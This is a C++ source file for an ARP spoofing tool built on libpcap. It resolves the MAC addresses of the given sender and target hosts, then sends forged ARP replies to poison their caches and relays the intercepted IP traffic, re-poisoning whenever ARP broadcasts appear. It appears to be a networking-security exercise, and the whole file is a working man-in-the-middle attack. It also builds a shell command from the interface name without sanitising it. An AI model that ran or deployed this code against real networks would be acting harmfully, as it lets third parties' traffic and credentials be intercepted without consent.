#include <iostream>
#include <pcap.h>
#include <cstring>
#include <unistd.h>
#include <netinet/ether.h>
#include <net/ethernet.h>
#include <arpa/inet.h>
#include <thread>
#include "psy_header.h"
#include "session_table.h"

#define BUF_SIZE 1024
#define SNAPLEN 65535
#define PKT_SIZE (sizeof(eth_header)+sizeof(arp_header)) // 42Byte
#define ETH_SIZE sizeof(eth_header) // 14Byte
#define SENDER 1
#define TARGET 0
#define REQUEST 1
#define INFECTION 2
using namespace std;


//char FILTER_RULE[BUF_SIZE] = "ether dst ";
struct ether_addr my_mac;
struct sockaddr_in my_ip;
pcap_t *use_dev;
uint8_t SES_COUNT;
bool FIND_CHK=false;

void err_print(int err_num)
{
    switch(err_num)
    {
    case 0:
        cout <<"ARP_Spoofing [Interface] [Sender_IP] [Target_IP] | [Sender_IP_2] [Target_IP_2] ..." <<endl;
        break;
    case 1:
        cout <<"PCAP_OPEN_ERROR!\n" <<endl;
        break;
    case 2:
        cout <<"PCAP_COMPILE_ERROR!\n" <<endl;
        break;
    case 3:
        cout <<"PCAP_SET_FILTER_ERROR!\n"<<endl;
        break;
    case 4:
        cout <<"THREAD_CREATE_ERROR!\n"<<endl;
        break;
    case 5:
        cout <<"NOT FOUND YOUR IP!\n"<<endl;
        break;
    case 6:
        cout <<"SEND_PACKET_ERROR!\n"<<endl;
        break;
    default:
        cout <<"Unknown ERROR!\n"<<endl;
        break;

    }
}

int send_ARP(Session_table *ses_table, uint8_t MODE)
{
    struct mine mh,mh_2;
    uint8_t packet[PKT_SIZE];
    uint8_t packet_2[PKT_SIZE];

    struct sockaddr_in Sender_ip,Target_ip;

    if(MODE == REQUEST)
    {
        for(int i=0; i<SES_COUNT; i++)
        {
            inet_aton(ses_table[i].get_S_IP(),&Sender_ip.sin_addr);
            inet_aton(ses_table[i].get_T_IP(),&Target_ip.sin_addr);

            memcpy(mh.src_mac,my_mac.ether_addr_octet,6);
            memcpy(mh.s_mac,my_mac.ether_addr_octet,6);

            mh.oper=0x0100;
            mh.s_ip=my_ip.sin_addr;
            mh.t_ip=Sender_ip.sin_addr;

            memcpy(packet,&mh,PKT_SIZE);
            if(pcap_sendpacket(use_dev,packet,PKT_SIZE) != 0)
            {
                err_print(6);
                return -1;
            }
            mh.t_ip=Target_ip.sin_addr;
            memcpy(packet,&mh,PKT_SIZE);
            if(pcap_sendpacket(use_dev,packet,PKT_SIZE) != 0)
            {
                err_print(6);
                return -1;
            }
            sleep(1);
        }
    }

    else if(MODE == INFECTION)
    {
        cout << "IM INFECTION"<< endl;
        for(int i=0; i<SES_COUNT; i++)
        {
            cout << "NUM"<<i <<endl;
            inet_aton(ses_table[i].get_S_IP(),&Sender_ip.sin_addr);
            inet_aton(ses_table[i].get_T_IP(),&Target_ip.sin_addr);
            memcpy(mh_2.src_mac,my_mac.ether_addr_octet,6);
            memcpy(mh_2.des_mac,ses_table[i].get_MAC(SENDER),6);
            memcpy(mh_2.s_mac,my_mac.ether_addr_octet,6);
            memcpy(mh_2.t_mac,ses_table[i].get_MAC(SENDER),6);

            for(int i=0; i<6; i++)
                printf("%02X",mh_2.des_mac[i]);
            printf("\n");

            mh_2.oper=0x0200;
            mh_2.s_ip=Target_ip.sin_addr;
            mh_2.t_ip=Sender_ip.sin_addr;

            memcpy(packet_2,&mh_2,PKT_SIZE);
            for(int i=0; i<42; i++)
            {
                if(i%16==0)
                    cout << endl;
                printf("%02x ",packet_2[i]);
            }
            cout << endl;
            if(pcap_sendpacket(use_dev,packet_2,PKT_SIZE) != 0)
            {
                err_print(6);
                exit(1);
            }
            sleep(1);
        }
    }
    return 1;
}

void find_mac(const uint8_t *pkt_data,Session_table *ses_table)
{
    struct arp_header *ah;
    ah = (struct arp_header *)pkt_data;
    uint8_t SES_FIND=0;

    struct sockaddr_in sender,target;

    for(int i=0; i<SES_COUNT; i++)
    {
        inet_aton(ses_table[i].get_S_IP(),&sender.sin_addr);
        inet_aton(ses_table[i].get_T_IP(),&target.sin_addr);

        if(!ses_table[i].get_find_chk(SENDER) && ah->s_ip.s_addr == sender.sin_addr.s_addr)
        {
            ses_table[i].set_MAC(ah->s_mac,SENDER);

            cout << "[" << i+1 << "]SESSION_SENDER_MAC_FIND"<<endl;
            ses_table[i].print_MAC(SENDER);
            ses_table[i].set_find_chk(SENDER);
        }

        if(!ses_table[i].get_find_chk(TARGET) && ah->s_ip.s_addr == target.sin_addr.s_addr)
        {
            ses_table[i].set_MAC(ah->s_mac,TARGET);

            cout << "[" << i+1 << "]SESSION_TARGET_MAC_FIND"<<endl;
            ses_table[i].print_MAC(TARGET);
            ses_table[i].set_find_chk(TARGET);
        }
        if(ses_table[i].get_find_chk(SENDER) && ses_table[i].get_find_chk(TARGET))
        {
            SES_FIND++;
            //cout << i<<"==SES_FIND!"<<endl;
        }

    }

    if(SES_FIND==SES_COUNT)
    {
        FIND_CHK=true;
        //cout << "ALL FIND!"<<endl;
        send_ARP(ses_table,INFECTION);
    }

}

int relay(Session_table *ses_table, const uint8_t *packet)
{
    ether_header *eh = (struct ether_header *)packet;
    ip_header *ih = (struct ip_header *)(packet+ETH_HLEN);
    struct sockaddr_in Sender_ip;
    uint16_t PACKET_LENGTH = ntohs(ih->ip_total_length)+ETH_HLEN;
    //cout << "PACKET_LENGTH : " << (int)PACKET_LENGTH << "\tSIZEOF : " << sizeof(packet) <<endl;
    for(int i=0; i<SES_COUNT; i++)
    {
        inet_aton(ses_table[i].get_S_IP(),&Sender_ip.sin_addr);

        if((ses_table[i].CMP_MAC(eh->ether_shost,SENDER))&&
                ih->ip_src_add.s_addr == Sender_ip.sin_addr.s_addr)
        {
            if(pcap_sendpacket(use_dev,packet,PACKET_LENGTH) != 0)
            {
                err_print(6);
                return -1;
            }

            cout << ses_table[i].get_S_IP() << " -> " << ses_table[i].get_T_IP() <<endl;
        }
    }
    return 1;
}



void init_dev(char *dev_name)
{

    char errbuf[ERRBUF_SIZ];
    struct bpf_program rule_struct;

    if((use_dev=pcap_open_live(dev_name,SNAPLEN,1,1,errbuf))==NULL)
    {
        err_print(1);
        exit(1);
    }

//    if(pcap_compile(use_dev,&rule_struct,FILTER_RULE,1,NULL)<0)
//    {
//        err_print(2);
//        exit(1);
//    }
//    if(pcap_setfilter(use_dev,&rule_struct)<0)
//    {
//        err_print(3);
//        exit(1);
//    }
    cout <<":: DEVICE SETTING SUCCESS ::"<<endl;
}


int find_me(char *dev_name) // Find_Me return value -> true / false
{
    FILE *ptr;
    char MAC[20];
    char IP[20]={0,};
    char cmd[300]={0,};

    //MY_MAC FIND
    sprintf(cmd,"ifconfig %s | grep HWaddr | awk '{print $5}'",dev_name);
    ptr = popen(cmd, "r");
    fgets(MAC, sizeof(MAC), ptr);
    pclose(ptr);
    ether_aton_r(MAC, &my_mac);
    //strcat(FILTER_RULE,MAC);

    //MY_IP FIND
    sprintf(cmd,"ifconfig %s | egrep 'inet addr:' | awk '{print $2}'",dev_name);
    ptr = popen(cmd, "r");
    fgets(IP, sizeof(IP), ptr);
    pclose(ptr);
    if(IP==NULL) return 1; // Find IP ?
    inet_aton(IP+5,&my_ip.sin_addr);
    return 0;
}

void cap_pkt(Session_table *ses_table)
{
    struct pcap_pkthdr *header;
    const uint8_t *pkt_data;
    int res;
    struct eth_header *eh;
    u_int16_t eth_type;

    while((res = pcap_next_ex(use_dev,&header,&pkt_data)) >= 0)
    {
        if(res == 0)
            continue;
        eh = (struct eth_header *)pkt_data;
        eth_type = ntohs(eh->eth_type);

        if(FIND_CHK)
        {
            if(eth_type == 0x0806 && !(memcmp(BROAD_CAST,eh->des_mac,6)))
            {
                if(send_ARP(ses_table,INFECTION) < 0)
                    break;
            }
            else if(eth_type ==0x0800)
            {
                cout << "DEBUG"<<endl;
                if(relay(ses_table,pkt_data) < 0)
                    break;
            }
        }

        else
        {
            pkt_data += ETH_SIZE;
            find_mac(pkt_data,ses_table);
        }
    }
}

int main(int argc, char **argv)
{
    if(argc < 4){
        err_print(0);
        return -1;
    }
    SES_COUNT = (argc-2)/2;
    int j=2;

    if(find_me(argv[1]))
    {
        err_print(5);
        return -1;
    }

    init_dev(argv[1]);

    /* SESSION_TABLE_SETTING */
    Session_table *ses_table;
    ses_table = new Session_table[SES_COUNT];
    for(int i=0; i<SES_COUNT; i++)
    {
        ses_table[i].set_IP(argv[j],argv[j+1]);
        j+=2;
    }
    thread t1(cap_pkt,ses_table);
    while(!FIND_CHK)
    {
        if(send_ARP(ses_table,REQUEST) < 0)
            break;
    }

    t1.join();
    pcap_close(use_dev);
}
